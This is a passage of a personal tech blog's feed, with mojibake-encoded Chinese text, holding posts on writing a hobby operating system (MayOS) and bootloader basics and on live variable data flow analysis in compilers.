                &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="program analysis" /><summary type="html">It has been a long time since I wrote the last blog, because I was preparing the Toefl and GRE exam ğŸ˜¢ (so hard). I reviewed the data flow analysis algoritms recently by watching the Li Yueâ€™s videos and reading Engineer A Compiler. Here are some ideas.</summary></entry><entry><title type="html">MayOSè¯ç”Ÿè®°å½•</title><link href="http://localhost:4000/blog/MayOS" rel="alternate" type="text/html" title="MayOSè¯ç”Ÿè®°å½•" /><published>2020-08-13T00:00:00+08:00</published><updated>2020-08-13T00:00:00+08:00</updated><id>http://localhost:4000/blog/MayOS</id><content type="html" xml:base="http://localhost:4000/blog/MayOS">&lt;h2 id=&quot;èµ·å› &quot;&gt;èµ·å› &lt;/h2&gt;
&lt;p&gt;â€ƒâ€ƒèµ·åˆå¼€å§‹æœ‰å†™æ“ä½œç³»ç»Ÿçš„å†²åŠ¨å¤§æ¦‚æ˜¯åœ¨å¤§äºŒä¸Šå­¦æœŸçš„æ—¶å€™ï¼Œåœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼š&lt;a href=&quot;https://www.zhihu.com/question/25628124/answer/99818238&quot;&gt;å¦‚ä½•è‡ªå·±å†™ä¸€ä¸ªæ“ä½œç³»ç»Ÿ&lt;/a&gt;ã€‚æˆ‘åœ¨é—®é¢˜ä¸‹é¢çœ‹åˆ°äº†&lt;a href=&quot;https://www.zhihu.com/people/silverainz&quot;&gt;è°·æœˆè½©å¸ˆå‚…&lt;/a&gt;çš„å›ç­”ï¼Œå½“æ—¶è§‰å¾—è¿™ä¹Ÿå¤ªå¸…äº†ï¼Œä¸€ä¸ªäººå±…ç„¶å¯ä»¥å†™å‡ºä¸€ä¸ªç›´æ¥è·‘åœ¨è£¸æœºä¸Šçš„å¦‚æ­¤å¤æ‚è€Œåºå¤§çš„ç¨‹åºï¼Œè°·æœˆè½©å¸ˆå‚…å½“æ—¶åœ¨é˜¿é‡Œé•¿äº­ç§‘æŠ€å·¥ä½œï¼Œä»¥è‡³äºæˆ‘éå¸¸æƒ³å»é•¿äº­å®ä¹ ï¼ˆåæ¥çœŸçš„å¦‚æ„¿ä»¥å¿2333ï¼‰ã€‚æˆ‘å½“æ—¶çš„æƒ…å†µæ˜¯ï¼Œæˆå¤©æ‰“ctfé€†å‘åšpwné¢˜ï¼Œåˆšåˆšç”¨verilogå†™å®Œä¸€ä¸ªcpuï¼Œæ¯”è¾ƒç†Ÿæ‚‰x86å’ŒMIPSçš„æ±‡ç¼–ï¼Œä½†æ˜¯å¯¹åº•å±‚çš„ä¸€äº›ç»†èŠ‚ä»¥åŠæ“ä½œç³»ç»Ÿã€ç¼–è¯‘åŸç†å‡ ä¹ä¸€æ— æ‰€çŸ¥ã€‚äºæ˜¯æˆ‘å°±åœ¨æƒ³ï¼Œè¦ä¸æˆ‘ä¹Ÿè‡ªå·±å†™ä¸€ä¸ªè¯•è¯•ï¼Œæ˜¯ä¸æ˜¯å†™å®Œäº†å°±è´¼ğŸ‚ ğŸº ï¼Œç›´æ¥å°±ä¼šLinuxå†…æ ¸äº†ï¼Ÿäºæ˜¯å¸¦ç€ç–‘æƒ‘æˆ‘å¼€å§‹äº†ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç»è¿‡&quot;&gt;ç»è¿‡&lt;/h2&gt;

&lt;p&gt;â€ƒâ€ƒåˆšå¼€å§‹æŠ±ç€ã€Š30å¤©è‡ªåˆ¶æ“ä½œç³»ç»Ÿå¼€å§‹çœ‹ã€‹ï¼Œè·Ÿç€åšäº†å‡ ç« æ„Ÿè§‰ä¸å¯¹åŠ²ï¼Œè¿™éƒ½9102å¹´äº†æ€ä¹ˆè¿˜åœ¨ç”¨è½¯ç›˜åšå¯åŠ¨ç›˜ï¼Œæˆ‘è¿™å¥½æ­¹ä¹Ÿå¾—ç”¨uç›˜åšå¯åŠ¨ç›˜å§ï¼Œäºæ˜¯å°±æ”¾å¼ƒäº†ï¼Œå¼€å§‹æ¢å¦ä¸€æœ¬å«ã€ŠOrangeâ€˜s ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„è¯ç”Ÿã€‹çš„ä¹¦çœ‹ã€‚è¿™æœ¬ä¹¦ä¹Ÿä¸å¯¹åŠ²ï¼Œæˆ‘è·Ÿç€å†™äº†34ç« ï¼Œæ±‡ç¼–éƒ½å¿«1åƒè¡Œäº†ï¼Œæ€ä¹ˆè¿˜åœ¨å†™æ±‡ç¼–ï¼Ÿï¼Ÿï¼Ÿ
&lt;img src=&quot;https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/cry.jpeg?raw=true&quot; alt=&quot;cry&quot; /&gt;
ç„¶åéšæ‰‹å¾€åç¿»äº†ç¿»ï¼Œæ€ä¹ˆåœ¨å†…æ ¸é‡Œè¿˜æ˜¯æœ‰ä¸€å †æ±‡ç¼–å†™çš„ä¸œè¥¿ï¼Ÿæˆ‘å½“æ—¶æ„è¯†åˆ°è¿™æœ¬ä¹¦ç”¨æ±‡ç¼–åšäº†å¤ªå¤šä¸œè¥¿ï¼Œå®é™…ä¸Šå¯ç»´æŠ¤æ€§å¾ˆå·®ï¼Œè€Œä¸”åœ¨ç»†èŠ‚ä¸Šä¹Ÿæ²¡æ€ä¹ˆè®²æ¸…æ¥šï¼Œäºæ˜¯å°±åœæ­¢äº†ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒå½“æ—¶æ­£å¥½æ‹¿åˆ°äº†é•¿äº­çš„offerï¼Œäºæ˜¯è¿™ä¸€æ‹–å°±åˆ°äº†2020å¹´3æœˆã€‚åœ¨å®¶æ— èŠï¼Œäºæ˜¯å¼€å§‹çœ‹æ¸…åçš„æ“ä½œç³»ç»Ÿè¯¾ç¨‹è®¾è®¡ &lt;a href=&quot;https://github.com/kiukotsu/ucore&quot;&gt;ucore&lt;/a&gt;ï¼Œè¿™ä¸ªé¡¹ç›®å¯ä»¥è¯´æ˜¯ç›¸å½“å‡ºåäº†ï¼Œæœ¬æ¥æ‰“ç®—ä»å¤´è·Ÿåˆ°å°¾çš„ï¼Œåæ¥å¡åœ¨äº†bootloaderç„¶åå°±åœæ­¢äº†ã€‚ä½†æ˜¯è¿™æœŸé—´æˆ‘çœ‹å®Œäº†ä¸€æœ¬é»‘è‰²ç»å…¸ä¹¦&lt;a href=&quot;https://book.douban.com/subject/5064311/&quot;&gt;ã€Šæ“ä½œç³»ç»Ÿ-ç²¾é«“ä¸è®¾è®¡åŸç†ã€‹&lt;/a&gt;ï¼Œç®—æ˜¯æŠŠåŸºæœ¬æ¦‚å¿µç»™å­¦äº†ä¸€è¾¹ï¼Œä½†æ˜¯å¯¹ç»†èŠ‚è¿˜æ˜¯ä¸€å¤´é›¾æ°´ï¼Œä»¥ä¸ºè‡ªå·±æ²¡æœ‰åŠ¨æ‰‹ä½“éªŒè¿‡ï¼Œæ‰€ä»¥è¿æé—®éƒ½ä¸çŸ¥é“æ€ä¹ˆé—®ã€‚è¿™æ—¶æˆ‘çš„ä¸€ä¸ªå¥½æœ‹å‹é‚¢å…¶æ­£ï¼Œè¶…çº§ç‰›é€¼çš„å¤§ä½¬ï¼Œä¿ç ”å»åŒ—å¤§äº†ï¼Œä»–çš„æ¯•è®¾å½“æ—¶åˆšåˆšåšå®Œï¼Œå¤§è‡´å†…å®¹æ˜¯ï¼š&lt;strong&gt;ç”¨è‡ªå·±å†™çš„ç¼–è¯‘å™¨ç¼–è¯‘ç”¨è‡ªå·±å†™çš„è¯­è¨€å†™çš„æ“ä½œç³»ç»Ÿï¼Œç„¶åè·‘åœ¨è‡ªå·±å†™çš„CPUä¸Š&lt;/strong&gt;ã€‚å¯¹ä½ æ²¡æœ‰çœ‹é”™ï¼Œå¼ºçš„ç¦»è°±ï¼Œç›¸å½“äºæ‰‹æ’¸ä¸€éæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿã€‚æˆ‘å½“æ—¶å—åˆ°äº†å¼ºçƒˆçš„éœ‡æ’¼ï¼Œå½“ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ï¼Œå°±æ„Ÿè§‰åƒæ˜¯è¿™æœºå™¨æ´»äº†è¿‡æ¥ï¼Œæœ‰äº†çµé­‚ã€‚åæ¥æˆ‘ä»¬ä¸€èµ·å‚åŠ äº†åä¸ºæ¯•æ˜‡æ¯ç¼–è¯‘å¤§èµ›ï¼Œæ’¸äº†ä¸€ä¸ªCè¯­è¨€çš„ç¼–è¯‘å™¨å‡ºæ¥ï¼Œæ‹¿äº†å›½äºŒã€‚ä¸ºäº†æŠŠè¿™äº›çŸ¥è¯†ä¼ æ‰¿ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨å­¦æ ¡æˆç«‹äº†ä¸€ä¸ªç»„ç»‡å«OWL â€“ OWL Wheel Labï¼Œé¡¹ç›®æ”¾åœ¨äº†è¿™é‡Œ&lt;a href=&quot;https://github.com/ustb-owl&quot;&gt;ustb-owl&lt;/a&gt;ï¼Œè¿™ä¸ªç»„ç»‡å¸Œæœ›èƒ½å¸å¼•ä¸€äº›å–œæ¬¢é€ è½®å­çš„åŒå­¦ï¼Œä¸€èµ·å†™ä¸€äº›fancyçš„ä»£ç ï¼Œåšä¸€äº›ç¡¬æ ¸çš„é¡¹ç›®ï¼Œè®©æˆ‘ä»¬é‡æ–°é€ ä¸€ä¸ªè½®å­ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒåˆä¸€æ‹–åˆ°äº†æš‘å‡ï¼Œæˆ‘æ»šå»ä¸Šæµ·äº¤å¤§æ‰“å·¥å»äº†ï¼Œè®¤è¯†äº†æˆ‘çš„å®¤å‹Happyå¸ˆå‚…ï¼Œhappyå¸ˆå‚…æ˜¯è¥¿ç”µçš„ï¼Œå¼ºçš„ç¦»è°±ï¼Œä»–å·²ç»å†™è¿‡ä¸€ä¸ªæ“ä½œç³»ç»Ÿäº†ï¼Œæˆ‘å¬å®Œä¹‹åååˆ†æ¿€åŠ¨ï¼Œç«‹åˆ»å‘ä»–è¯·æ•™å¿ƒè·¯å†ç¨‹ï¼Œä»–è¯´ä»–è¯»äº†ã€Šæ“ä½œç³»ç»ŸçœŸç›¸è¿˜åŸã€‹å’Œæ¯›å¾·æ“è€çˆ·å­çš„ã€ŠLINUXå†…æ ¸æºä»£ç æƒ…æ™¯åˆ†æã€‹è¿™æœ¬ä¹¦ï¼Œæˆ‘æƒŠäº†ï¼Œæ¯›å¾·æ“è€çˆ·å­è¿™æœ¬ä¹¦å¯ä»¥è¯´æ˜¯ç›¸å½“ç¡¬æ ¸ï¼Œé‡Œé¢é€šç¯‡ä»£ç ï¼Œçœ‹äº†è®©äººç›´æƒ³ç¡è§‰ï¼Œä¸è¿‡è‡³æ­¤ï¼Œæˆ‘çœŸæ­£ä¸‹å®šå†³å¿ƒï¼Œè¦äº²æ‰‹å®Œæˆè¿™ä¸ªæƒ³æ³•ï¼Œäºæ˜¯å¼€å§‹äº†&lt;a href=&quot;https://github.com/Explainaur/MayOS&quot;&gt;MayOS&lt;/a&gt;çš„æ—…ç¨‹ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ˜ç¡®ç›®æ ‡&quot;&gt;æ˜ç¡®ç›®æ ‡&lt;/h3&gt;

&lt;p&gt;ç”±äºä¹‹å‰å°è¯•äº†å¥½å‡ æ¬¡ï¼Œæˆ‘å¤§æ¦‚æœ‰äº†ä¸€äº›ç›®æ ‡ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¸€å®šè¦ç”¨Cè¯­è¨€å†™å†…æ ¸ï¼Œå°½é‡é¿å…æ±‡ç¼–ï¼Œæé«˜å¯ç»´æŠ¤æ€§&lt;/li&gt;
  &lt;li&gt;ä¸€å®šè¦ä»bootloaderå¼€å§‹å†™ï¼Œä¸æƒ³ç”¨grubè¿™äº›ä¸œè¥¿&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å…³äºç¬¬ä¸€ç‚¹ï¼Œæˆ‘å›°æƒ‘äº†å¥½ä¹…å¥½ä¹…ï¼Œæˆ‘ä¹‹å‰çœ‹çš„ä¹¦é‡Œä¸€ç›´éƒ½æ˜¯åœ¨ç”¨æ±‡ç¼–å†™ï¼Œä¸€ä¸ªbootloaderå‡ ä¹è¦æŠŠæ‰€æœ‰çš„ä¸œè¥¿ç»™åšå®Œï¼Œæ˜æ˜å¯ä»¥ç”¨Cå†™çš„ä¸œè¥¿ä¹Ÿéè¦ç”¨æ±‡ç¼–å†™ã€‚æœ€ç»ˆæˆ‘åœ¨&lt;a href=&quot;http://www.osdever.net/bkerndev/Docs/intro.htm&quot;&gt;Branâ€˜s kernel&lt;/a&gt;è¿™ä¸ªæ–‡æ¡£é‡Œæ‰¾åˆ°äº†ç­”æ¡ˆã€‚åœ¨æˆ‘æ‰€çœ‹åˆ°çš„èµ„æ–™ä¸­ï¼Œè¿™ä¸ªæ–‡æ¡£æ˜¯å”¯ä¸€ä¸€ä¸ªç›´æ¥ç¼–è¯‘å‡ºä¸€ä¸ªçº¯binaryçš„å†…æ ¸ï¼Œå…¶ä»–çš„åŸºæœ¬éƒ½æ˜¯ç¼–è¯‘æˆELFæ–‡ä»¶ï¼Œç„¶åç”¨æ±‡ç¼–å»è§£æELFã€‚æ‰€ä»¥æˆ‘ç°åœ¨åªè¦èƒ½è®©bootloaderåŠ è½½å†…æ ¸åˆ°å†…å­˜é‡Œï¼Œç„¶åè·³åˆ°mainå‡½æ•°æ‰§è¡Œå°±ç®—æ˜¯æˆäº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¼•å¯¼&quot;&gt;å¼•å¯¼&lt;/h3&gt;

&lt;p&gt;â€ƒâ€ƒæ“ä½œç³»ç»Ÿå°±æ˜¯ä¸€ä¸ªè·‘åœ¨è£¸æœºä¸Šçš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·ç†è§£ï¼ŒCPUå°±æ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼Œå¯„å­˜å™¨çš„å€¼å°±æ˜¯ä»–çš„çŠ¶æ€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®å¯„å­˜å™¨çš„å€¼æ¥ä¿®æ”¹ä»–çš„çŠ¶æ€ã€‚æœºå™¨åœ¨åˆšå¯åŠ¨çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸è¿˜åœ¨ç¡¬ç›˜é‡Œï¼Œä¹Ÿå°±æ˜¯å¤–å­˜ï¼Œè¿™æ˜¾ç„¶æ˜¯æ²¡æœ‰åŠæ³•æ‰§è¡Œçš„ï¼Œæˆ‘ä»¬éœ€è¦æƒ³ä¸ªåŠæ³•æŠŠå®ƒåŠ è½½åˆ°å†…å­˜é‡Œã€‚äºæ˜¯å‰è¾ˆä»¬ä¾¿è®¾è®¡å‡ºäº†MBRå’ŒBootloaderã€‚æœºå™¨åœ¨å¯åŠ¨çš„æ—¶å€™ä¼šæŠŠç£ç›˜ä¸Šç¬¬ä¸€æ‰‡åŒºçš„512ä¸ªå­—èŠ‚çš„å†…å®¹åŠ è½½åˆ°å†…å­˜çš„0x7c00è¿™é‡Œï¼Œè¿™æ˜¯BIOSå®ç°çš„ï¼Œç„¶åCPUå°±è·³åˆ°è¿™é‡Œæ¥æ‰§è¡Œã€‚è¿™512ä¸ªå­—èŠ‚å°±å«&lt;strong&gt;ä¸»å¼•å¯¼è®°å½•(Main Boot Record)&lt;/strong&gt;å³MBRã€‚æ˜¾ç„¶512ä¸ªå­—èŠ‚èƒ½åšçš„äº‹æƒ…å¤ªå°‘äº†ï¼Œä¸è¶³ä»¥æŠŠå†…æ ¸åŠ è½½åˆ°å†…å­˜é‡Œ,å› æ­¤MBRçš„å·¥ä½œä¸»è¦æ˜¯å°†BootloaderåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç”±Bootloaderè´Ÿè´£åŠ è½½å†…æ ¸ï¼Œä»¥åŠåšä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒä½ åœ¨ç½‘ä¸Šæœç´¢å†™æ“ä½œç³»ç»Ÿæœ‰å…³çš„ä¸­æ–‡èµ„æ–™ï¼ŒåŸºæœ¬éƒ½æ˜¯ä»€ä¹ˆ0x7c00ï¼Œä»€ä¹ˆ0xAA55è¿™äº›ï¼Œå†™ä¸ªåƒåœ¾bootsectorï¼Œä½†æ˜¯è¿™ä¸œè¥¿é¡¶å¤šç®—ä¸ªæ±‡ç¼–ç»ƒä¹ ï¼Œçœ‹æ¥å¤§å®¶éƒ½æ˜¯æµ…å°è¾„æ­¢ã€‚&lt;/p&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="OS" /><summary type="html">èµ·å›  â€ƒâ€ƒèµ·åˆå¼€å§‹æœ‰å†™æ“ä½œç³»ç»Ÿçš„å†²åŠ¨å¤§æ¦‚æ˜¯åœ¨å¤§äºŒä¸Šå­¦æœŸçš„æ—¶å€™ï¼Œåœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•è‡ªå·±å†™ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚æˆ‘åœ¨é—®é¢˜ä¸‹é¢çœ‹åˆ°äº†è°·æœˆè½©å¸ˆå‚…çš„å›ç­”ï¼Œå½“æ—¶è§‰å¾—è¿™ä¹Ÿå¤ªå¸…äº†ï¼Œä¸€ä¸ªäººå±…ç„¶å¯ä»¥å†™å‡ºä¸€ä¸ªç›´æ¥è·‘åœ¨è£¸æœºä¸Šçš„å¦‚æ­¤å¤æ‚è€Œåºå¤§çš„ç¨‹åºï¼Œè°·æœˆè½©å¸ˆå‚…å½“æ—¶åœ¨é˜¿é‡Œé•¿äº­ç§‘æŠ€å·¥ä½œï¼Œä»¥è‡³äºæˆ‘éå¸¸æƒ³å»é•¿äº­å®ä¹ ï¼ˆåæ¥çœŸçš„å¦‚æ„¿ä»¥å¿2333ï¼‰ã€‚æˆ‘å½“æ—¶çš„æƒ…å†µæ˜¯ï¼Œæˆå¤©æ‰“ctfé€†å‘åšpwné¢˜ï¼Œåˆšåˆšç”¨verilogå†™å®Œä¸€ä¸ªcpuï¼Œæ¯”è¾ƒç†Ÿæ‚‰x86å’ŒMIPSçš„æ±‡ç¼–ï¼Œä½†æ˜¯å¯¹åº•å±‚çš„ä¸€äº›ç»†èŠ‚ä»¥åŠæ“ä½œç³»ç»Ÿã€ç¼–è¯‘åŸç†å‡ ä¹ä¸€æ— æ‰€çŸ¥ã€‚äºæ˜¯æˆ‘å°±åœ¨æƒ³ï¼Œè¦ä¸æˆ‘ä¹Ÿè‡ªå·±å†™ä¸€ä¸ªè¯•è¯•ï¼Œæ˜¯ä¸æ˜¯å†™å®Œäº†å°±è´¼ğŸ‚ ğŸº ï¼Œç›´æ¥å°±ä¼šLinuxå†…æ ¸äº†ï¼Ÿäºæ˜¯å¸¦ç€ç–‘æƒ‘æˆ‘å¼€å§‹äº†ã€‚</summary></entry><entry><title type="html">Data Flow Analysis â€“ Live variable analysis</title><link href="http://localhost:4000/blog/live-variable-analysis" rel="alternate" type="text/html" title="Data Flow Analysis -- Live variable analysis" /><published>2020-07-17T00:00:00+08:00</published><updated>2020-07-17T00:00:00+08:00</updated><id>http://localhost:4000/blog/live-variable-analysis</id><content type="html" xml:base="http://localhost:4000/blog/live-variable-analysis">&lt;p&gt;â€ƒâ€ƒã€ŠEngineering a Compilerã€‹ä¸­çš„8.6.1ç« ä»‹ç»äº†ä¸€ç§æ•°æ®æµåˆ†æç®—æ³•ï¼ŒLive variable analysisï¼Œå³æ´»åŠ¨å˜é‡åˆ†æï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥ç”¨æ¥æ£€æµ‹æœªåˆå§‹åŒ–å˜é‡çš„ä½¿ç”¨ã€‚ç¼–è¯‘å™¨æˆ–è€…ä»£ç æ‰«æå™¨å¯ä»¥å‘ç°å¹¶æŠ¥å‘Šè¿™ç§æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒä¸¾ä¸ªæ —å­ï¼Œå½“ä»påˆ°æŸå¤„ä½¿ç”¨å˜é‡vçš„ä½ç½®ä¹‹é—´çš„è·¯å¾„ï¼Œåœ¨è¿™ä¹‹é—´å˜é‡væ²¡æœ‰è¢«é‡æ–°å®šä¹‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´våœ¨på¤„æ˜¯æ´»åŠ¨çš„ã€‚æˆ‘ä»¬é€šè¿‡è®¡ç®—åï¼Œæˆ‘ä»¬å°†åŸºæœ¬å—bçš„å˜é‡æ´»åŠ¨ä¿¡æ¯å­˜å‚¨åˆ° &lt;em&gt;LiveOut(b)&lt;/em&gt; ä¸­ï¼Œè¯¥é›†åˆåŒ…å«äº†ä»ç¨‹åºå—bé€€å‡ºæ—¶æ‰€æœ‰çš„æ´»åŠ¨å˜é‡ã€‚å› æ­¤ï¼Œåœ¨æŸä¸ªcfgä¸­ï¼Œæˆ‘ä»¬å¦‚æœæ±‚å‡ºentryçš„ &lt;em&gt;LiveOut(n0)&lt;/em&gt; é›†åˆä¸æ˜¯ç©ºé›†ï¼Œåˆ™è¿™äº›å˜é‡å­˜åœ¨æ½œåœ¨çš„ä¸ºåˆå§‹åŒ–è°ƒç”¨ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ç¼ºä¸ªå›¾ç‰‡å„¿ï½ ç»™ä¸ªdemoå›¾&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ä¸åŠ¨ç‚¹æ³•æ±‚è§£liveouté›†åˆ&quot;&gt;ä¸åŠ¨ç‚¹æ³•æ±‚è§£LiveOuté›†åˆ&lt;/h3&gt;

&lt;p&gt;â€ƒâ€ƒå¯¹äºcfgçš„æ¯ä¸ªèŠ‚ç‚¹næ¥è¯´ï¼ŒLiveOut(n)æ˜¯é€šè¿‡ä¸€ä¸ªæ–¹ç¨‹å†³å®šçš„ï¼Œè¯¥æ–¹ç¨‹ä½¿ç”¨äº†nèŠ‚ç‚¹çš„æ‰€æœ‰åç»§LiveOuté›†åˆï¼Œä»¥åŠ &lt;strong&gt;&lt;em&gt;UEVar(n)&lt;/em&gt;&lt;/strong&gt; å’Œ &lt;strong&gt;&lt;em&gt;VarKill(n)&lt;/em&gt;&lt;/strong&gt; é›†åˆã€‚å®šä¹‰ LiveOut(n)çš„æ–¹ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;LiveOut(n) = \mathop{\cup}\limits_{m \in succ(n)}(UEVar(m)\cup(LiveOut(m) \cap \overline{VarKill(m)}))&lt;/script&gt;

&lt;p&gt;â€ƒâ€ƒ&lt;strong&gt;&lt;em&gt;UEVar(m)&lt;/em&gt;&lt;/strong&gt; åŒ…å«äº†mä¸­å‘ä¸Šå±•ç¤ºçš„å˜é‡ï¼Œå³åœ¨mä¸­æ²¡æœ‰é‡æ–°å®šä¹‰å°±ä½¿ç”¨çš„å˜é‡ï¼Œè¿™ç§å…³ç³»åœ¨LLVMä¸­ä¸€èˆ¬å¯¹åº”ä¸€ç§useå…³ç³»ã€‚è€Œ &lt;strong&gt;&lt;em&gt;VarKill(m)&lt;/em&gt;&lt;/strong&gt; åˆ™ä»£è¡¨äº†åœ¨mä¸­è¢«é‡æ–°å®šä¹‰çš„å˜é‡ï¼Œé‡æ–°å®šä¹‰å³ä»£è¡¨åŸå€¼çš„ç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œæ‰€ä»¥è¢«killæ‰ã€‚ä¸Šè¿°æ–¹ç¨‹ä¸Šåˆ’çº¿ä»£è¡¨äº† &lt;em&gt;VarKill(m)&lt;/em&gt; çš„é€»è¾‘è¡¥é›†ï¼Œè¿™é‡Œçš„måˆ™æ˜¯nçš„æŸåç»§èŠ‚ç‚¹ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒç©¶ç«Ÿæ€ä¹ˆæ ·æ‰ç®—å˜é‡å­˜æ´»å˜ï¼Ÿå¯¹äºä¸€ä¸ªåŸºæœ¬ç¨‹åºå—mæ¥è¯´ï¼Œä¸€èˆ¬åªæœ‰ä¸¤ç§æƒ…å†µï¼ŒæŸå˜é‡vï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åœ¨mä¸­ï¼Œå¯¹vé‡æ–°å®šä¹‰ä¹‹å‰å°±ä½¿ç”¨äº†vï¼Œè¿™ç§æƒ…å†µå°±æ˜¯&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;v \in UEVar(m)&lt;/script&gt;

&lt;ol&gt;
  &lt;li&gt;våœ¨é€€å‡ºç¨‹åºå—mæ—¶ä»ç„¶æ˜¯å­˜æ´»çš„ï¼Œå°±æ˜¯vâ€æ¯«å‘æ— æŸâ€çš„ç©¿è¿‡äº†mï¼Œå› ä¸ºmä¸­æ²¡æœ‰å¯¹vè¿›è¡Œé‡æ–°å®šä¹‰ï¼Œåœ¨måçš„blockæœ‰å¯¹vçš„useï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µå°±æ˜¯ï¼š&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;v \in LiveOut(m) \cap \overline {VarKill(m)}&lt;/script&gt;

&lt;p&gt;äºæ˜¯ä¹ï¼ŒæŠŠè¿™ä¿©é›†åˆå¹¶èµ·æ¥å°±æ˜¯må¯¹å¯¹ &lt;em&gt;LiveOut(n)&lt;/em&gt; çš„è´¡çŒ®ï¼Œç„¶åæŠŠæ‰€æœ‰nçš„åç»§mçš„ç»“æœå¹¶èµ·æ¥å°±æ˜¯æ•´ä¸ª &lt;em&gt;LiveOut(n)&lt;/em&gt; çš„æ­£ç¡®ç»“æœã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒå…³äºè¿™éƒ¨åˆ†å†…å®¹ï¼Œåœ¨ææ¨¾è€å¸ˆçš„ã€Šè½¯ä»¶åˆ†æã€‹ç¬¬4è¯¾ä¸­æœ‰æ‰€ä»‹ç»ï¼Œä½†æ˜¯è¿­ä»£æ–¹å¼ç¨æœ‰ä¸åŒï¼Œä»–ç»™å‡ºäº†å¦ä¸€ä¸ªå…¬å¼ï¼š&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;LiveOut(n) = \mathop{\cup}\limits_{m \in succ(n)}(UEVar(m)\cup(LiveOut(m) - VarKill(m))&lt;/script&gt;

&lt;blockquote&gt;
  &lt;p&gt;ç¼ºä¸ªå›¾ç‰‡å„¿ï½ ç»™å‡ºè¿™ä¸¤ç§æƒ…å†µå±•ç¤ºå›¾&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;â€ƒâ€ƒäº‹å®ä¸Šè¿™ä¸¤ä¸ªå…¬å¼æ˜¯ä¸€ä¸ªæ„æ€ï¼Œè¿™ä¸ªæ–¹ç¨‹æè¿°äº†ä¸€ä¸ª&lt;strong&gt;åå‘æ•°æ®æµé—®é¢˜&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;åå‘æ•°æ®æµé—®é¢˜ï¼š ä¿¡æ¯æ²¿ç€å›¾çš„è¾¹çš„åå‘æµåŠ¨ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;â€ƒâ€ƒé‚£ä¹ˆä¸ºå•¥è¿™é‡Œè¦å–æ‰€æœ‰åç»§èŠ‚ç‚¹mçš„è¿ç®—ç»“æœçš„å¹¶é›†å˜ï¼Ÿå› ä¸ºåç»§çš„ä»»ä½•ä¸€ä¸ªBasic Blockç”¨åˆ°äº†æŸå˜é‡véƒ½ä¼šäº§ç”Ÿä¸€ä¸ªuseå…³ç³»ï¼Œå› æ­¤éƒ½æœ‰å¯èƒ½å¼•å‘å˜é‡çš„æœªåˆå§‹åŒ–è°ƒç”¨ã€‚æ‰€ä»¥è¿™ä¸ªæ•°æ®æµåˆ†æåº”è¯¥å±äº &lt;strong&gt;&lt;em&gt;May Analysis&lt;/em&gt;&lt;/strong&gt;, æ•…åº”å½“ä½¿ç”¨å¹¶é›†è¿ç®—ï¼Œè€Œ &lt;strong&gt;&lt;em&gt;Must Analysis&lt;/em&gt;&lt;/strong&gt; é€šå¸¸ä½¿ç”¨äº¤é›†çš„è¿ç®—ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¿­ä»£æ³•æ±‚ä¸åŠ¨ç‚¹&quot;&gt;è¿­ä»£æ³•æ±‚ä¸åŠ¨ç‚¹&lt;/h3&gt;

&lt;p&gt;â€ƒâ€ƒæ•°æ®æµåˆ†ææˆ‘ä»¬é€šå¸¸ä½¿ç”¨è¿­ä»£æ³•æ¥reach fixed pointã€‚å¯¹äºä¸€ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä¸‰æ­¥æ¥å®ç°ç®—æ³•ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ„å»ºCFG&lt;/li&gt;
